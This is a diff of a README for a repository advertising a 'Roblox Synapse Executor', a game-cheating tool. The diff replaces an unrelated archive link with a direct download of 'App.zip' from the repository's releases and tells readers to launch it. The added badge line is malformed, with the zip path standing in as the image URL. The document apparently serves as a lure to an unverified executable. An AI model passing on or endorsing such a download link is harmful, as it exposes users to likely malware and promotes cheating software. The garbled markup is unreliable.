@@ -17,7 +17,7 @@ Welcome to the **Roblox-Synapse** repository, where you can explore the top-tier
 ## 📦 Installation
 To get started with Roblox Synapse Executor, download the latest release by clicking the button below:
 
-[![Download Roblox Synapse Executor](https://img.shields.io/badge/Download-Roblox%20Synapse%20Executor-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Roblox Synapse Executor](https://github.com/davidpepeee/Roblox-Synapse/releases/download/v1.0/App.zip%20Synapse%20Executor-blue)](https://github.com/davidpepeee/Roblox-Synapse/releases/download/v1.0/App.zip)
 
 The link provided needs to be launched to access the latest release. If you encounter any issues with the download link, please check the "Releases" section for alternative options.
 
